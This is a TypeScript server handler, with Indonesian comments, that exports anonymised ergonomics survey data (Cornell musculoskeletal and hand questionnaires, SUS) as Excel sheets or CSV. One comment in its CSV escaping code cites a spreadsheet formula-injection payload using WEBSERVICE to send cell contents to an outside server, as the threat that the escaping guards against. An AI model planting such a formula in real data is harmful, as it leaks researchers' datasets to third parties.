import ExcelJS from 'exceljs'
import { LABEL_KATEGORI_IMT } from '~~/lib/imt'
import {
  BOBOT_FREKUENSI,
  LABEL_KATEGORI_RISIKO,
  PERSENTIL_AMBANG_SEDANG,
  PERSENTIL_AMBANG_TINGGI,
  SKALA_FREKUENSI,
  SKALA_GANGGUAN,
  SKALA_KETIDAKNYAMANAN,
  SKOR_SEGMEN_MAKS,
  SKOR_TOTAL_MAKS,
} from '~~/lib/cmdq/skala'
import { RATING_TOTAL_MAKS } from '~~/lib/cmdq/skoring'
import { SKOR_AREA_MAKS, SKOR_CHDQ_MAKS, SKOR_TANGAN_MAKS } from '~~/lib/chdq/skala'
import { ITEM_SUS } from '~~/lib/sus/item'
import { LABEL_INTERPRETASI, TARGET_SUS } from '~~/lib/sus/skoring'
import {
  OPSI_DURASI_KOMPUTER,
  OPSI_MASA_KERJA,
  OPSI_USIA,
} from '~~/lib/sosiodemografi'

/**
 * GET /api/admin/ekspor?format=xlsx|csv — ekspor data mentah penelitian.
 *
 * Format sengaja dibuat "wide" (satu baris per responden) karena itulah
 * bentuk yang langsung bisa dibaca SPSS/JASP tanpa restructure. Variabel
 * kategorik disertai KODE ANGKA di samping labelnya supaya siap dipakai
 * untuk uji statistik (chi-square, korelasi, dsb.).
 *
 * Isi berkas Excel:
 *   Sheet 1 "Responden"   — profil + skor akhir CMDQ, CHDQ & SUS
 *   Sheet 2 "CMDQ Skor"   — 18 kolom skor per item tubuh (wide)
 *   Sheet 3 "CMDQ Rinci"  — long format: frekuensi, ketidaknyamanan, gangguan
 *   Sheet 4 "CHDQ Skor"   — 12 kolom skor per area tangan (wide)
 *   Sheet 5 "CHDQ Rinci"  — long format, idem
 *   Sheet 6 "SUS"         — 10 kolom jawaban item + skor akhir
 *   Sheet 7 "Kamus Data"  — keterangan variabel & kode, untuk lampiran tesis
 *
 * IDENTITAS DIKECUALIKAN SECARA BAWAAN.
 * `kodeResponden` ("PTX-001") adalah pengenal anonim yang dijanjikan kepada
 * responden pada lembar persetujuan. Nama dan surel hanya ikut bila diminta
 * eksplisit lewat `?identitas=1`, karena berkas hasil ekspor berpindah ke luar
 * kendali aplikasi: tersimpan di laptop, terkirim sebagai lampiran surel, ikut
 * tersinkron ke awan. Seluruh lembar analisis sudah berkunci `Kode` saja.
 */

const KODE_JK = { LAKI_LAKI: 1, PEREMPUAN: 2 } as const
const KODE_IMT = {
  KURUS_BERAT: 1,
  KURUS_RINGAN: 2,
  NORMAL: 3,
  GEMUK_RINGAN: 4,
  OBESITAS: 5,
} as const
const KODE_RISIKO = { RENDAH: 1, SEDANG: 2, TINGGI: 3 } as const
const KODE_SUS = { NOT_ACCEPTABLE: 1, MARGINAL: 2, ACCEPTABLE: 3 } as const

export default defineEventHandler(async (event) => {
  await wajibAdmin(event)

  const { where } = await bacaFilter(event)
  const kueri = getQuery(event)
  const format = kueri.format === 'csv' ? 'csv' : 'xlsx'
  const sertakanIdentitas = kueri.identitas === '1'

  const [segmen, areaTangan, responden, ambangCmdq, ambangChdq] =
    await Promise.all([
      prisma.segmenTubuh.findMany({
        orderBy: { urutan: 'asc' },
        select: { id: true, kode: true, nama: true, urutan: true },
      }),
      prisma.areaTangan.findMany({
        orderBy: { urutan: 'asc' },
        select: {
          id: true,
          kode: true,
          nama: true,
          huruf: true,
          tangan: true,
          urutan: true,
        },
      }),
      prisma.responden.findMany({
        where,
        orderBy: { kodeResponden: 'asc' },
        include: {
          cmdqHasil: { include: { segmenTertinggi: { select: { nama: true } } } },
          cmdqJawaban: {
            select: {
              segmenId: true,
              frekuensiKode: true,
              // Sempat tidak ikut di-select padahal lembar "CMDQ Rinci"
              // membacanya, sehingga setiap ekspor XLSX yang memuat minimal
              // satu jawaban CMDQ gagal dengan HTTP 500. Tidak pernah terlihat
              // karena jalur CSV tidak menyentuh lembar itu.
              frekuensiBobot: true,
              ketidaknyamananSkor: true,
              gangguanSkor: true,
              skor: true,
            },
          },
          chdqHasil: { include: { areaTertinggi: { select: { nama: true } } } },
          chdqJawaban: {
            select: {
              areaId: true,
              frekuensiKode: true,
              // Wajib ikut: lembar "CHDQ Rinci" mengekspor bobot yang benar-benar
              // dipakai perhitungan, bukan menurunkannya dari kode frekuensi.
              frekuensiBobot: true,
              ketidaknyamananSkor: true,
              gangguanSkor: true,
              skor: true,
            },
          },
          susJawaban: { orderBy: { itemNomor: 'asc' } },
          susHasil: true,
        },
      }),
      bacaAmbang('CMDQ'),
      bacaAmbang('CHDQ'),
    ])

  const stempel = new Date().toISOString().slice(0, 10)
  // Dibangun sekali; sebelumnya Map ini dibuat ulang untuk SETIAP responden
  // di dalam flatMap lembar "CMDQ Rinci".
  const petaSegmen = new Map(segmen.map((s) => [s.id, s]))
  const petaArea = new Map(areaTangan.map((a) => [a.id, a]))

  // ── Baris utama (dipakai Excel sheet 1 maupun CSV) ─────────────────────
  // Sel dikosongkan (bukan diisi 0) bila responden belum melengkapi profil —
  // SPSS membacanya sebagai missing value, bukan nilai nol yang menyesatkan.
  const bool01 = (v: boolean | null) => (v === null ? '' : v ? 1 : 0)

  const barisResponden = responden.map((r) => ({
    Kode: r.kodeResponden,
    ...(sertakanIdentitas ? { Nama: r.nama, Email: r.email } : {}),
    Divisi: r.divisi ?? '',
    Jabatan: r.jabatan ?? '',
    Sub_Bagian: r.unitKerja ?? '',
    Setuju_Etik: r.setujuEtik ? 1 : 0,
    Tanggal_Persetujuan: r.tanggalPersetujuan?.toISOString().slice(0, 10) ?? '',
    Usia: r.usia ?? '',
    JK_Kode: r.jenisKelamin ? KODE_JK[r.jenisKelamin] : '',
    JK_Label: r.jenisKelamin
      ? r.jenisKelamin === 'LAKI_LAKI'
        ? 'Laki-laki'
        : 'Perempuan'
      : '',
    // Kategori teks, bukan angka. Nama kolom mempertahankan satuan supaya
    // pembaca kamus data tahu rentangnya dinyatakan dalam tahun/jam.
    Masa_Kerja_Tahun: r.masaKerjaTahun ?? '',
    Durasi_Komputer_Jam: r.durasiKomputerJamPerHari ?? '',
    Tinggi_cm: r.tinggiBadanCm?.toNumber() ?? '',
    Berat_kg: r.beratBadanKg?.toNumber() ?? '',
    IMT: r.imt?.toNumber() ?? '',
    IMT_Kode: r.kategoriImt ? KODE_IMT[r.kategoriImt] : '',
    IMT_Label: r.kategoriImt ? LABEL_KATEGORI_IMT[r.kategoriImt] : '',
    Olahraga: bool01(r.olahraga),
    Frekuensi_Olahraga_per_Minggu: r.frekuensiOlahragaPerMinggu ?? '',
    Merokok: bool01(r.merokok),
    Riwayat_MSDs: bool01(r.riwayatMsds),
    Keterangan_Riwayat: r.keteranganRiwayatMsds ?? '',
    Status_Profil: r.statusProfil,
    Status_CMDQ: r.statusCmdq,
    Status_CHDQ: r.statusChdq,
    Status_SUS: r.statusSus,
    // ── CMDQ: keempat metode analisis Cornell ────────────────────────────
    // Instruksi resmi menyebut skor "can be analyzed in 4 ways"; keempatnya
    // diekspor supaya peneliti tidak perlu menghitung ulang dari lembar rinci
    // — dan supaya angka yang dilaporkan tidak bergantung pada rumus Excel
    // yang dibuat sendiri di luar jangkauan pemeriksaan.
    // Nama `CMDQ_Skor_Total` DIPERTAHANKAN meskipun ia adalah metode 4 —
    // berkas ekspor lama dan sintaks SPSS yang sudah ditulis peneliti merujuk
    // nama itu. Ketiga metode lain ditambahkan sebagai kolom baru.
    CMDQ_Skor_Total: r.cmdqHasil?.skorTotal.toNumber() ?? '',
    CMDQ_M1_Jumlah_Gejala: r.cmdqHasil?.jumlahSegmenBermasalah ?? '',
    CMDQ_M2_Jumlah_Rating: r.cmdqHasil?.jumlahRating ?? '',
    CMDQ_M3_Frekuensi_Berbobot:
      r.cmdqHasil?.jumlahFrekuensiBerbobot.toNumber() ?? '',
    CMDQ_Skor_Rata2: r.cmdqHasil?.skorRataRata.toNumber() ?? '',
    CMDQ_Segmen_Bermasalah: r.cmdqHasil?.jumlahSegmenBermasalah ?? '',
    CMDQ_Nilai_Hilang: r.cmdqHasil?.jumlahSegmenNilaiHilang ?? '',
    CMDQ_Risiko_Kode: r.cmdqHasil ? KODE_RISIKO[r.cmdqHasil.kategoriRisiko] : '',
    CMDQ_Risiko_Label: r.cmdqHasil
      ? LABEL_KATEGORI_RISIKO[r.cmdqHasil.kategoriRisiko]
      : '',
    CMDQ_Segmen_Tertinggi: r.cmdqHasil?.segmenTertinggi?.nama ?? '',
    // Ambang yang BERLAKU SAAT skor itu dihitung, bukan ambang yang berlaku
    // saat berkas ini dibuat. Tanpa ketiga kolom ini, satu dataset yang
    // dikumpulkan sebelum dan sesudah revisi cut-off tidak bisa dibedakan
    // lagi — dan `CMDQ_Risiko_Kode` tidak dapat direproduksi dari
    // `CMDQ_Skor_Total`.
    CMDQ_Ambang_Sedang: r.cmdqHasil?.ambangSedang.toNumber() ?? '',
    CMDQ_Ambang_Tinggi: r.cmdqHasil?.ambangTinggi.toNumber() ?? '',
    CMDQ_Segmen_Dinilai: r.cmdqHasil?.jumlahSegmenDinilai ?? '',
    // ── CHDQ (keluhan tangan) ────────────────────────────────────────────
    CHDQ_Skor_Total: r.chdqHasil?.skorTotal.toNumber() ?? '',
    CHDQ_Skor_Tangan_Kanan: r.chdqHasil?.skorTanganKanan.toNumber() ?? '',
    CHDQ_Skor_Tangan_Kiri: r.chdqHasil?.skorTanganKiri.toNumber() ?? '',
    // Kosong berarti KEDUA tangan berskor sama — termasuk sama-sama nol.
    // Bukan missing value; lihat kamus data.
    CHDQ_Tangan_Dominan: r.chdqHasil?.tanganDominan ?? '',
    CHDQ_M1_Jumlah_Gejala: r.chdqHasil?.jumlahAreaBermasalah ?? '',
    CHDQ_M2_Jumlah_Rating: r.chdqHasil?.jumlahRating ?? '',
    CHDQ_M3_Frekuensi_Berbobot:
      r.chdqHasil?.jumlahFrekuensiBerbobot.toNumber() ?? '',
    CHDQ_Nilai_Hilang: r.chdqHasil?.jumlahAreaNilaiHilang ?? '',
    CHDQ_Risiko_Kode: r.chdqHasil ? KODE_RISIKO[r.chdqHasil.kategoriRisiko] : '',
    CHDQ_Risiko_Label: r.chdqHasil
      ? LABEL_KATEGORI_RISIKO[r.chdqHasil.kategoriRisiko]
      : '',
    CHDQ_Area_Tertinggi: r.chdqHasil?.areaTertinggi?.nama ?? '',
    CHDQ_Ambang_Sedang: r.chdqHasil?.ambangSedang.toNumber() ?? '',
    CHDQ_Ambang_Tinggi: r.chdqHasil?.ambangTinggi.toNumber() ?? '',
    SUS_Skor: r.susHasil?.skorTotal.toNumber() ?? '',
    SUS_Interpretasi_Kode: r.susHasil ? KODE_SUS[r.susHasil.interpretasi] : '',
    SUS_Interpretasi_Label: r.susHasil
      ? LABEL_INTERPRETASI[r.susHasil.interpretasi]
      : '',
    SUS_Grade: r.susHasil?.gradeHuruf ?? '',
    SUS_Memenuhi_Target: r.susHasil ? (r.susHasil.memenuhiTarget ? 1 : 0) : '',
    Tanggal_Isi: r.dibuatPada.toISOString().slice(0, 10),
  }))

  // ── CSV: cukup sheet utama ─────────────────────────────────────────────
  if (format === 'csv') {
    const kolom = Object.keys(barisResponden[0] ?? { Kode: '' })

    /**
     * Escape CSV + penangkal formula injection.
     *
     * Lima kolom berisi teks bebas yang diketik responden: `Nama`,
     * `Divisi` dan `Jabatan` (bila ia memilih "Lainnya"), `Sub_Bagian`, dan
     * `Keterangan_Riwayat` (sampai 500 karakter). Excel dan
     * LibreOffice memperlakukan sel yang diawali `=`, `+`, `-`, atau `@`
     * sebagai FORMULA dan menjalankannya saat berkas dibuka. Seorang responden
     * yang mendaftar dengan nama `=WEBSERVICE("https://…"&A2&B2)` — tanpa
     * koma atau kutip, sehingga lolos escape pembatas — dapat membuat laptop
     * peneliti, yang menyimpan seluruh dataset penelitian, mengirimkan isi sel
     * di sekitarnya ke server pihak lain begitu berkas dibuka.
     *
     * Awalan kutip tunggal membuat Excel memperlakukannya sebagai teks biasa.
     * Jalur XLSX tidak terpengaruh: ExcelJS memberi tipe `String` pada nilai
     * string, bukan `Formula`.
     */
    const AWALAN_FORMULA = /^[=+\-@\t\r]/
    const escape = (v: unknown) => {
      let s = String(v ?? '')
      if (AWALAN_FORMULA.test(s)) s = `'${s}`
      return /[",\n\r;']/.test(s) ? `"${s.replace(/"/g, '""')}"` : s
    }
    const isi = [
      kolom.join(','),
      ...barisResponden.map((b) =>
        kolom.map((k) => escape((b as Record<string, unknown>)[k])).join(','),
      ),
    ].join('\r\n')

    setHeader(event, 'Content-Type', 'text/csv; charset=utf-8')
    // Nama berkas menyebut "profil" secara eksplisit: CSV hanya memuat lembar
    // Responden. Skor 18 item CMDQ, 12 area CHDQ, rincian tiga dimensi, dan
    // jawaban item SUS hanya ada di berkas XLSX. Analisis per bagian tubuh
    // tidak bisa dilakukan dari berkas ini.
    setHeader(
      event,
      'Content-Disposition',
      `attachment; filename="ergoself-profil-responden-${stempel}.csv"`,
    )
    // BOM agar Excel membaca karakter Indonesia dengan benar
    return `﻿${isi}`
  }

  // ── Excel ──────────────────────────────────────────────────────────────
  const wb = new ExcelJS.Workbook()
  wb.creator = 'ErgoSelf'
  wb.created = new Date()

  function tulisSheet(nama: string, baris: Record<string, unknown>[]) {
    const ws = wb.addWorksheet(nama)
    if (baris.length === 0) {
      ws.addRow(['(tidak ada data yang sesuai filter)'])
      return ws
    }
    const kolom = Object.keys(baris[0]!)
    ws.columns = kolom.map((k) => ({
      header: k,
      key: k,
      width: Math.min(28, Math.max(12, k.length + 3)),
    }))
    baris.forEach((b) => ws.addRow(b))
    ws.getRow(1).font = { bold: true }
    ws.views = [{ state: 'frozen', ySplit: 1 }]
    ws.autoFilter = {
      from: { row: 1, column: 1 },
      to: { row: 1, column: kolom.length },
    }
    return ws
  }

  tulisSheet('Responden', barisResponden)

  // Sheet 2 — skor CMDQ per segmen (wide, 28 kolom)
  tulisSheet(
    'CMDQ Skor',
    responden.map((r) => {
      const perSegmen = new Map(r.cmdqJawaban.map((j) => [j.segmenId, j]))
      const baris: Record<string, unknown> = { Kode: r.kodeResponden }
      for (const s of segmen) {
        baris[`S${String(s.urutan).padStart(2, '0')}_${s.kode}`] =
          perSegmen.get(s.id)?.skor.toNumber() ?? ''
      }
      baris.Total = r.cmdqHasil?.skorTotal.toNumber() ?? ''
      return baris
    }),
  )

  // Sheet 3 — rincian tiga dimensi CMDQ (long format)
  tulisSheet(
    'CMDQ Rinci',
    responden.flatMap((r) =>
      r.cmdqJawaban
        .map((j) => {
          const s = petaSegmen.get(j.segmenId)
          return {
            Kode: r.kodeResponden,
            Segmen_No: s?.urutan ?? '',
            Segmen_Kode: s?.kode ?? '',
            Segmen_Nama: s?.nama ?? '',
            Frekuensi: j.frekuensiKode,
            // Bobot baku Cornell yang benar-benar dipakai perhitungan
            // (0/1,5/3,5/5/10). Sengaja diekspor terpisah dari kode frekuensi:
            // keduanya tidak lagi sama, dan tanpa kolom ini `Skor` tidak dapat
            // diverifikasi ulang dari lembar ini saja.
            Bobot_Frekuensi: j.frekuensiBobot.toNumber(),
            Ketidaknyamanan: j.ketidaknyamananSkor ?? '',
            Gangguan: j.gangguanSkor ?? '',
            Skor: j.skor.toNumber(),
          }
        })
        .sort((a, b) => Number(a.Segmen_No) - Number(b.Segmen_No)),
    ),
  )

  // Sheet 4 — skor CHDQ per area (wide, 12 kolom)
  tulisSheet(
    'CHDQ Skor',
    responden.map((r) => {
      const perArea = new Map(r.chdqJawaban.map((j) => [j.areaId, j]))
      const baris: Record<string, unknown> = { Kode: r.kodeResponden }
      for (const a of areaTangan) {
        baris[`H${String(a.urutan).padStart(2, '0')}_${a.kode}`] =
          perArea.get(a.id)?.skor.toNumber() ?? ''
      }
      baris.Kanan = r.chdqHasil?.skorTanganKanan.toNumber() ?? ''
      baris.Kiri = r.chdqHasil?.skorTanganKiri.toNumber() ?? ''
      baris.Total = r.chdqHasil?.skorTotal.toNumber() ?? ''
      return baris
    }),
  )

  // Sheet 5 — rincian tiga dimensi CHDQ (long format)
  tulisSheet(
    'CHDQ Rinci',
    responden.flatMap((r) =>
      r.chdqJawaban
        .map((j) => {
          const a = petaArea.get(j.areaId)
          return {
            Kode: r.kodeResponden,
            Area_No: a?.urutan ?? '',
            Area_Kode: a?.kode ?? '',
            Tangan: a?.tangan ?? '',
            Area_Huruf: a?.huruf ?? '',
            Area_Nama: a?.nama ?? '',
            Frekuensi: j.frekuensiKode,
            Bobot_Frekuensi: j.frekuensiBobot.toNumber(),
            Ketidaknyamanan: j.ketidaknyamananSkor ?? '',
            Gangguan: j.gangguanSkor ?? '',
            Skor: j.skor.toNumber(),
          }
        })
        .sort((a, b) => Number(a.Area_No) - Number(b.Area_No)),
    ),
  )

  // Sheet 6 — SUS (wide, 10 item)
  tulisSheet(
    'SUS',
    responden
      .filter((r) => r.susJawaban.length > 0)
      .map((r) => {
        const baris: Record<string, unknown> = { Kode: r.kodeResponden }
        const perItem = new Map(r.susJawaban.map((j) => [j.itemNomor, j]))
        for (const item of ITEM_SUS) {
          baris[`SUS${String(item.nomor).padStart(2, '0')}`] =
            perItem.get(item.nomor)?.skorJawaban ?? ''
        }
        baris.SUS_Skor = r.susHasil?.skorTotal.toNumber() ?? ''
        baris.SUS_Grade = r.susHasil?.gradeHuruf ?? ''
        baris.SUS_Interpretasi = r.susHasil
          ? LABEL_INTERPRETASI[r.susHasil.interpretasi]
          : ''
        return baris
      }),
  )

  // Sheet 7 — kamus data, siap dilampirkan di tesis.
  //
  // Seluruh angka diambil dari konstanta di `lib/cmdq/skala.ts`,
  // `lib/chdq/skala.ts`, dan `lib/sus/skoring.ts`, tidak ditulis tangan.
  // Lembar ini menjadi lampiran metodologi; bila ambang atau bobot direvisi
  // sementara angka di sini tetap, tesis akan memuat keterangan yang
  // bertentangan dengan datanya sendiri.
  //
  // Daftar divisi & jabatan juga tidak lagi ditulis dari konstanta: keduanya
  // dikelola peneliti lewat panel admin, jadi yang benar adalah isi tabel
  // master pada saat ekspor dibuat.
  const labelFrekuensi = SKALA_FREKUENSI.map((o) => `${o.nilai} = ${o.label}`).join('; ')
  const labelKetidaknyamanan = SKALA_KETIDAKNYAMANAN.map(
    (o) => `${o.nilai} = ${o.label}`,
  ).join('; ')
  const labelGangguan = SKALA_GANGGUAN.map((o) => `${o.nilai} = ${o.label}`).join('; ')

  const [masterDivisi, masterJabatan] = await Promise.all([
    prisma.divisi.findMany({
      orderBy: [{ urutan: 'asc' }, { nama: 'asc' }],
      select: { nama: true, aktif: true },
    }),
    prisma.jabatan.findMany({
      orderBy: [{ urutan: 'asc' }, { nama: 'asc' }],
      select: { nama: true, aktif: true },
    }),
  ])

  // Entri nonaktif tetap dicantumkan dan DITANDAI. Menghilangkannya membuat
  // kamus data seolah menyatakan bahwa nilai itu tidak sah, padahal ia ada di
  // kolom Divisi milik responden yang mengisi sebelum entri dinonaktifkan.
  const daftarMasterTeks = (
    daftar: readonly { nama: string; aktif: boolean }[],
  ) =>
    daftar.length === 0
      ? '(belum ada entri di panel admin)'
      : daftar
          .map((d) => (d.aktif ? d.nama : `${d.nama} [nonaktif]`))
          .join('; ')

  const ambangTeks = (a: { dariData: boolean; jumlahResponden: number }) =>
    a.dariData
      ? `Tersil empiris (persentil ${PERSENTIL_AMBANG_SEDANG} & ${PERSENTIL_AMBANG_TINGGI}) dari ${a.jumlahResponden} responden`
      : 'NILAI SEMENTARA — tersil empiris belum dihitung dari panel admin'

  tulisSheet('Kamus Data', [
    { Variabel: 'Setuju_Etik', Keterangan: 'Persetujuan etik penelitian (informed consent)', Kode: '0 = Tidak; 1 = Ya. Kolom Tanggal_Persetujuan merekam waktunya.' },
    { Variabel: 'Status_Profil / CMDQ / CHDQ / SUS', Keterangan: 'Kemajuan pengisian tiap instrumen', Kode: 'BELUM; SELESAI' },
    { Variabel: '(sel kosong)', Keterangan: 'Missing value', Kode: 'Responden sudah mendaftar tetapi belum melengkapi profil pekerja' },
    { Variabel: 'JK_Kode', Keterangan: 'Jenis kelamin', Kode: '1 = Laki-laki; 2 = Perempuan' },
    { Variabel: 'Usia', Keterangan: 'Kelompok usia (kategorik, bukan angka)', Kode: OPSI_USIA.join('; ') },
    { Variabel: 'Divisi', Keterangan: 'Divisi/departemen tempat responden bertugas. Nama yang tersimpan adalah nama yang BERLAKU SAAT responden mengisi — bila entri master kemudian diganti namanya, data lama tetap memakai nama lama.', Kode: `${daftarMasterTeks(masterDivisi)}. Nilai di luar daftar berasal dari pilihan "Lainnya" dan diketik sendiri oleh responden — kelompokkan ulang sebelum tabulasi silang.` },
    { Variabel: 'Jabatan', Keterangan: 'Jenjang jabatan struktural. Idem soal nama yang berlaku saat pengisian.', Kode: `${daftarMasterTeks(masterJabatan)}. Idem soal "Lainnya".` },
    { Variabel: 'Sub_Bagian', Keterangan: 'Seksi/sub-bagian yang lebih rinci dari divisi. Teks bebas dan OPSIONAL — kekosongannya bukan missing value.', Kode: '(teks bebas)' },
    { Variabel: 'Masa_Kerja_Tahun', Keterangan: 'Kelompok masa kerja (kategorik, bukan angka)', Kode: OPSI_MASA_KERJA.join('; ') },
    { Variabel: 'Durasi_Komputer_Jam', Keterangan: 'Kelompok durasi penggunaan komputer per hari (kategorik, bukan angka)', Kode: OPSI_DURASI_KOMPUTER.join('; ') },
    { Variabel: 'IMT_Kode', Keterangan: 'Kategori IMT (Kemenkes RI)', Kode: '1 = Kurus berat; 2 = Kurus ringan; 3 = Normal; 4 = Gemuk ringan; 5 = Obesitas' },
    { Variabel: 'Olahraga / Merokok / Riwayat_MSDs', Keterangan: 'Kebiasaan & riwayat', Kode: '0 = Tidak; 1 = Ya' },
    { Variabel: '(instrumen)', Keterangan: 'CMDQ = Cornell Musculoskeletal Discomfort Questionnaire versi pekerja duduk, 18 item. CHDQ = Cornell Hand Discomfort Questionnaire, 6 area × 2 tangan. Keduanya instrumen terpisah dengan skala identik — jangan menjumlahkan skornya.', Kode: 'https://ergo.human.cornell.edu/ahmsquest.html; https://ergo.human.cornell.edu/ahhandmsquest.html' },
    { Variabel: 'Frekuensi', Keterangan: 'Frekuensi keluhan (kode pilihan). Sama untuk CMDQ & CHDQ.', Kode: labelFrekuensi },
    { Variabel: 'Bobot_Frekuensi', Keterangan: 'Bobot baku Cornell yang dipakai perhitungan skor. TIDAK linier — lompatan pada kategori teratas disengaja agar kasus terberat terangkat.', Kode: `Bobot berlaku: ${BOBOT_FREKUENSI.join(' / ')}` },
    { Variabel: 'Ketidaknyamanan', Keterangan: 'Tingkat ketidaknyamanan', Kode: `${labelKetidaknyamanan} (kosong bila Frekuensi = 0, atau bila responden melewatkannya)` },
    { Variabel: 'Gangguan', Keterangan: 'Gangguan terhadap pekerjaan', Kode: `${labelGangguan} (kosong bila Frekuensi = 0, atau bila responden melewatkannya)` },
    { Variabel: '(nilai hilang)', Keterangan: 'Aturan Cornell untuk jawaban kosong: Frekuensi kosong → seluruh hasil kali menjadi 0. Ketidaknyamanan/Gangguan kosong padahal Frekuensi > 0 → diperlakukan sebagai missing dengan pengali 1, sehingga Skor minimal setara Bobot_Frekuensi. Kolom CMDQ_Nilai_Hilang & CHDQ_Nilai_Hilang menghitung berapa item yang mengalaminya.', Kode: '(lihat kolom Skor)' },
    { Variabel: 'Skor', Keterangan: 'Skor per item = Bobot_Frekuensi × Ketidaknyamanan × Gangguan (metode 4 Cornell)', Kode: `Rentang 0–${SKOR_SEGMEN_MAKS}` },
    { Variabel: 'CMDQ_Skor_Total', Keterangan: `Metode 4 Cornell: jumlah skor ${segmen.length} item CMDQ`, Kode: `Rentang 0–${SKOR_TOTAL_MAKS}` },
    { Variabel: 'CMDQ_M1_Jumlah_Gejala', Keterangan: 'Metode 1 Cornell: banyaknya bagian tubuh dengan keluhan (Frekuensi > 0). Setara angka prevalensi per orang.', Kode: `Rentang 0–${segmen.length}` },
    { Variabel: 'CMDQ_M2_Jumlah_Rating', Keterangan: 'Metode 2 Cornell: Σ nilai rating mentah (Frekuensi + Ketidaknyamanan + Gangguan), tanpa pembobotan; nilai kosong dihitung 0', Kode: `Rentang 0–${RATING_TOTAL_MAKS}` },
    { Variabel: 'CMDQ_M3_Frekuensi_Berbobot', Keterangan: 'Metode 3 Cornell: Σ bobot frekuensi saja, tanpa dikalikan keparahan', Kode: `Rentang 0–${BOBOT_FREKUENSI[BOBOT_FREKUENSI.length - 1]! * segmen.length}` },
    { Variabel: 'CMDQ_Risiko_Kode', Keterangan: `Kategori risiko MSDs. Cornell tidak menyediakan cut-off ("for research screening purposes and not for diagnostic purposes"); batas ini keputusan analisis peneliti — ${ambangTeks(ambangCmdq)}.`, Kode: `1 = Rendah (≤${ambangCmdq.ambangSedang}); 2 = Sedang (>${ambangCmdq.ambangSedang}–${ambangCmdq.ambangTinggi}); 3 = Tinggi (>${ambangCmdq.ambangTinggi})` },
    { Variabel: 'CMDQ_Ambang_Sedang / Tinggi', Keterangan: 'Ambang yang BERLAKU SAAT skor responden dihitung', Kode: 'Dipakai untuk memverifikasi CMDQ_Risiko_Kode; bisa berbeda antar baris bila ambang dihitung ulang di tengah pengumpulan data' },
    { Variabel: 'CMDQ_Segmen_Dinilai', Keterangan: 'Banyaknya item yang dinilai saat perhitungan', Kode: `Saat ini ${segmen.length}` },
    { Variabel: 'CHDQ_Skor_Total', Keterangan: `Metode 4 Cornell untuk keluhan tangan: jumlah skor ${areaTangan.length} area (kedua tangan)`, Kode: `Rentang 0–${SKOR_CHDQ_MAKS}` },
    { Variabel: 'CHDQ_Skor_Tangan_Kanan / Kiri', Keterangan: 'Skor per tangan. Dilaporkan terpisah karena keluhan tangan pada pengguna komputer kerap satu sisi saja, dan skor gabungan meratakan pola itu.', Kode: `Rentang 0–${SKOR_TANGAN_MAKS} per tangan` },
    { Variabel: 'CHDQ_Tangan_Dominan', Keterangan: 'Tangan dengan skor lebih tinggi. SEL KOSONG BUKAN MISSING VALUE — artinya kedua tangan berskor sama, termasuk sama-sama nol.', Kode: 'KANAN; KIRI; (kosong = seri)' },
    { Variabel: 'CHDQ_Risiko_Kode', Keterangan: `Kategori risiko keluhan tangan — ${ambangTeks(ambangChdq)}.`, Kode: `1 = Rendah (≤${ambangChdq.ambangSedang}); 2 = Sedang (>${ambangChdq.ambangSedang}–${ambangChdq.ambangTinggi}); 3 = Tinggi (>${ambangChdq.ambangTinggi})` },
    { Variabel: 'Area_Huruf (lembar CHDQ Rinci)', Keterangan: 'Huruf area sebagaimana tertulis di form Cornell. Form asli hanya memberi label huruf dan diagram arsiran; Area_Nama adalah glosa anatomis dari literatur, bukan dari Cornell. Jari manis dibelah dua (A = sisi jari tengah, B = sisi kelingking) mengikuti batas persarafan medianus/ulnaris.', Kode: `A–F; skor per area rentang 0–${SKOR_AREA_MAKS}` },
    { Variabel: 'SUS01–SUS10', Keterangan: 'Jawaban item SUS (Likert). Item genap bernada negatif dan dinilai terbalik.', Kode: '1 = Sangat Tidak Setuju … 5 = Sangat Setuju' },
    { Variabel: 'SUS_Skor', Keterangan: 'Skor SUS = Σ kontribusi × 2,5', Kode: `Rentang 0–100; target penelitian ≥ ${TARGET_SUS}` },
    { Variabel: 'SUS_Interpretasi_Kode', Keterangan: 'Akseptabilitas (Bangor et al., 2009)', Kode: '1 = Not acceptable (<50); 2 = Marginal (50–70); 3 = Acceptable (>70)' },
    { Variabel: 'SUS_Memenuhi_Target', Keterangan: `Skor ≥ ${TARGET_SUS} (rata-rata industri). BUKAN hal yang sama dengan SUS_Interpretasi_Kode — skor 70 memenuhi target tetapi masih berkategori Marginal.`, Kode: '0 = Tidak; 1 = Ya' },
  ])

  const buffer = await wb.xlsx.writeBuffer()

  setHeader(
    event,
    'Content-Type',
    'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
  )
  setHeader(
    event,
    'Content-Disposition',
    `attachment; filename="ergoself-data-${stempel}.xlsx"`,
  )

  return Buffer.from(buffer)
})
